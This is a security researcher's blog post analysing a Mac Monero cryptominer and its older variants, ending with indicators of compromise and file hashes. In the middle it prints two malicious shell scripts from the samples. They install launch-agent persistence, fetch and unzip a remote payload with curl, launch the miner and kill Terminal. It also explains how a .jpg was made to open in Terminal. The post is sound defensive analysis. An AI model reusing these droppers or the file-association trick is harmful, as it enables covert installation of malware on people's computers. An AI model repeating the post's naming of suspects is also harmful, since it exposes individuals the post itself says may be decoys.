@@ -1,0 +1,100 @@
+New Mac cryptominer has 23 older variants
+On February 1, a new Mac cryptominer was discovered being distributed via a hack of the MacUpdate website. Since then, we’ve been doing some digging and found that this isolated incident was just the tip of the iceberg. The malware delivered by the MacUpdate hack appears to be the culmination of something that has been around since at least early October of last year.
+As we usually do when looking into new malware, we did some searches through the website VirusTotal—a massive crowd-sourced malware repository —to see if we could find any other variants. These searches, called “retrohunts,” don’t always turn up much, but in this case we struck gold, finding no less than 23 older variants of this malware!
+The oldest of these was a file named “niceass.zip” (nice name). Decompressing the file resulted in a folder with two files: an image file called “ass.jpg” and an apparently broken application named “temp.”
+
+As indicated by the Finder, the “temp” application does not work at all, and on inspection, it didn’t even have the right internal structure to be a macOS app.
+
+However, the contents are nonetheless intriguing. They are:
+
+an “ass.jpg” image (which you’re really better off not seeing)
+a file named “com.zerowidth.launched.apple.plist” which is a launch agent .plist file
+an executable named “Dock” (the same name as the Apple process that manages the Dock)
+a Frameworks folder containing some external framework code that must be needed by the Dock executable
+
+Clearly, this isn’t an app, but some kind of naughtiness is planned.
+What about the first ass.jpg file, located outside the temp.app bundle? In what I bet is not at all surprising to anyone, it turns out it’s not actually a JPEG file. Instead, it’s a shell script.
+nohup mv ~/Downloads/niceass/temp.app ~/Downloads/niceass/.tmp
+mv ~/Downloads/niceass/.tmp/Apple ~/Library &&
+mkdir -p ~/Library/LaunchAgents &&
+mv ~/Library/Apple/com.zerowidth.launched.apple.plist ~/Library/LaunchAgents &&
+launchctl load -w ~/Library/LaunchAgents/com.zerowidth.launched.apple.plist &&
+rm -rf ~/Downloads/niceass/.tmp &&
+rm ~/Downloads/niceass/ass.jpg &&
+mv ~/Library/Apple/ass.jpg ~/Downloads/niceass &&
+open -a Preview ~/Downloads/niceass/ass.jpg &&
+~/Library/Apple/Dock -user sarahmayergo1990@gmail.com@gmail.com -xmr &
+killall Terminal
+As we can see, this script assumes it will be run from within the niceass folder, which in turn must be in the Downloads folder. If it’s anywhere else, or if you removed the broken temp.app, the malware will fail completely.
+The first step is to rename temp.app to “.tmp”, which hides it from view thanks to the initial period in the name. (I’m not sure why it wasn’t distributed with this name in the first place, which would have been far less suspicious.) Next, it moves the various components out of the niceass folder and into the desired locations. The launch agent .plist file is installed and loaded.
+Next, the script cleans up a bit and replaces the ass.jpg file with the ass.jpg file from inside the Apple folder. That file is then opened in Preview (ow, my eyes!) to cover up the fact that what was opened wasn’t just an image file.
+Finally, the malicious Dock process is launched, passing in what appears to be an erroneous email address as the username to log in to Minergate. Dock will then suck up as much CPU time as it can to mine the Monero cryptocurrency. Hold on tight as your MacBook Pro’s fans attempt to propel it into flight!
+The interesting thing is how the ass.jpg runs. We’ve covered a number of tricks used by malware in the past to make a shell script look like another type of file, such as a space at the end to prevent the extension from actually being treated as an extension or the use of special non-ASCII lookalike characters in the extension. In this case, though, that’s an honest-to-goodness .jpg extension.
+There’s actually a simple way to override this extension. Using the Get Info window (File -> Get Info in the Finder), you can change the application used to open a particular file.
+
+Doing so saves this setting in special metadata associated with the file. If the file is then compressed into a zip file using a Mac, that metadata will be preserved in some special files added to the zip file, and it will be reconstructed on another Mac when decompressed. This metadata can be viewed from the command line using the “xattr -l” command.
+$ xattr -l /Users/thomas/Desktop/link-to-download.txt
+com.apple.LaunchServices.OpenWith:
+00000000 62 70 6C 69 73 74 30 30 D3 01 02 03 04 05 06 57 |bplist00.......W|
+00000010 76 65 72 73 69 6F 6E 54 70 61 74 68 5F 10 10 62 |versionTpath_..b|
+00000020 75 6E 64 6C 65 69 64 65 6E 74 69 66 69 65 72 10 |undleidentifier.|
+00000030 00 5F 10 24 2F 41 70 70 6C 69 63 61 74 69 6F 6E |._.$/Application|
+00000040 73 2F 55 74 69 6C 69 74 69 65 73 2F 54 65 72 6D |s/Utilities/Term|
+00000050 69 6E 61 6C 2E 61 70 70 5F 10 12 63 6F 6D 2E 61 |inal.app_..com.a|
+00000060 70 70 6C 65 2E 54 65 72 6D 69 6E 61 6C 08 0F 17 |pple.Terminal...|
+00000070 1C 2F 31 58 00 00 00 00 00 00 01 01 00 00 00 00 |./1X............|
+00000080 00 00 00 07 00 00 00 00 00 00 00 00 00 00 00 00 |................|
+00000090 00 00 00 6D |...m|
+All in all, this is not a highly sophisticated piece of malware. There are many points of failure and things that will cause suspicion, and these could have all been avoided easily. But hey, this is just the earliest variant. We’ve still got 22 others to look at!
+It turns out that none of the other niceass variants are any more sophisticated. Chronologically, the next variant is called “serial.zip”, and it works similarly, except that the suspicious temp.app has been renamed .temp.app, hiding it from the user’s view. It replaces the nasty photo with a text file containing a serial number of some kind. Otherwise, it is mostly identical, even down to the same damaged email address passed to the miner.
+Next came a long string of files claiming to be JPEGs taken from WhatsApp, having names like “WhatsApp Image 2017-12-23 at 13.31.15.jpeg.” These didn’t rely on the temp.app, instead downloading the payload from public.adobecc.com as we saw with the MacUpdate variants, and grabbing a decoy image from www.askideas.com.
+nohup rm -rf ~/Downloads/WhatsApp\ Image\ 2017-12-23\ at\ 13.31.15.jpeg &&
+curl -o ~/Downloads/WhatsApp\ Image\ 2017-12-23\ at\ 13.31.15.jpeg https://www.askideas.com/media/38/I-Killed-Black-Snake-Why-U-Not-Happy-Funny-Pet-Meme-Image-For-Whatsapp.jpg &&
+open -a Preview ~/Downloads/WhatsApp\ Image\ 2017-12-23\ at\ 13.31.15.jpeg &&
+curl -o ~/Library/1.zip https://public.adobecc.com/files/1UFRTMCE4GD4DBFSPQVFGD2FYYVFFF?content_disposition=attachment &&
+cd ~/Library &&
+unzip ~/Library/1.zip &&
+rm -rf ~/Library/1.zip &&
+mkdir -p ~/Library/LaunchAgents &&
+mv ~/Library/GoogleSoftwareUpdateAgent.plist ~/Library/LaunchAgents &&
+launchctl load -w ~/Library/LaunchAgents/GoogleSoftwareUpdateAgent.plist &
+killall Terminal
+This variant also employs the MacOSupdate.plist and MacOS.plist launch agents as seen with the MacUpdate variants of the malware. These WhatsApp variants are dated between December 23 and January 26 (judging by the file metadata, not the filename).
+The final variant, dated December 26, was a single file named link-to-download.txt, which had similarities with both the WhatsApp and serial/niceass variants.
+Interestingly, these files are all cryptographically signed using two different Apple developer certificates. These certificates were issued to people named (or claiming to be named) Ramos Jaxson and Tiago Mateus. (Mr. Jaxson was also responsible for the signatures on the more recent MacUpdate variants.)
+In an interesting development, reported first by Arnaud Abbati of SentinelOne, the hidden .DS_Store metadata file inside the more recent MacUpdate variants revealed Mr. Mateus’ full name to be Tiago Brandao Mateus.
+
+This is a pretty specific name, but it remains to be seen whether this is his real name or if it’s a decoy. Since this malware is not terribly sophisticated, with some pretty dumb mistakes being made with it, my suspicion is that the hacker who created it had no idea that the .DS_Store file existed, much less that it would capture the username he was using on his computer.
+Hopefully, the authorities can track down Mr. Mateus and suss out any involvement he may have had in the creation of this malware.
+IOCs
+Dropped files
+~/Library/LaunchAgents/com.zerowidth.launched.apple.plist
+~/Library/LaunchAgents/GoogleSoftwareUpdateAgent.plist
+~/Library/LaunchAgents/MacOS.plist
+~/Library/LaunchAgents/MacOSupdate.plist
+~/Library/Apple/Dock
+~/Library/mdworker/mdworker
+Hashes
+3ec55908c3357b92a58f877440d110a970d4ce4cc76a8ac1a7281abec71c717f
+d58dd1f057da70a28a67ef48fe4c3942f99ffa082dd7d79c139db7f86e8ac63c
+b30ef172e01a31c687e311334677241c2b338844a6bc92bfe06bb5f359281dfa
+47667ab1c5950b77ed50a7e629dd916db7505bcb9abff6e21dd7edaa280cc043
+6b8d88f08569c4ff778647bede9dbb329dad628474422f86cec2ba0c3084072a
+a6f454b71a4d4f1c9767197f5459363f77fb205ef274a189e4e0aefa825b19f9
+ac8f29c762e27d5c6ccb73c016cd05f79123bcf5420e9f7547839243c39d6a4c
+dd3731d421901f17f213ffd0a38596e12f413d43100be9754879247f51c75397
+f23ec1d8de76824838b2ac2782ac97819f94c3a5695e2be83357f5a6e0d12d8c
+2527ff0b11fd312c7aa7fc39f19c08298f2a0e17c171f96f83e8a32c4979c878
+3dc8fdfb09f38f6ca1ae0360660a9b71e3be58b1ea72655fa07fcc0ed8633e29
+eff259d20b01d96b6ae9c05106e6462f5e0dd8ae6dc548f5b9d87444b45988d0
+cfa7a04e4958acf89baa0dd2ce2a8b9618fd500f7ed6fffd4cf7703c9bbde188
+28219506e683f4324815bcfb4fb9115abfdc611ad49f00d1382ff005f8b10103
+cc058cc8821ed92e0c8385a36b4aae589e7383a05eba764195f311c046a519fd
+592ba3b270c5f46c2912e64d855f2ff918af4b9708845b5239b83e949d670ba9
+a1cdbd2a03bb84f001034ecaed52e45147213e487b2b83df94da42893a2b725f
+783ffb8b21e8df463c8f024d4e085aae345ee5784db62c7209f07f30a0fda399
+e59c8db1a48b08d03e0c64b9259c11154e267662d5d1183b8dc6837afc33006a
+17ff20345c9579ee1f5f51cb5c36806e238536b18db112a99a15b9e0ff190acf
+1fc064e7d6624d1539469dc038709fffb7aabc6b484446d7d9dd87507680155f
+83f40501e7f27b2b3aa0590b63985b9af99e05dd71f333b2b2d430bd9b4335df
+f75b21f758b698822518eee358c8b57e9f5421d691d5a9d6fbe395a974c57c3e
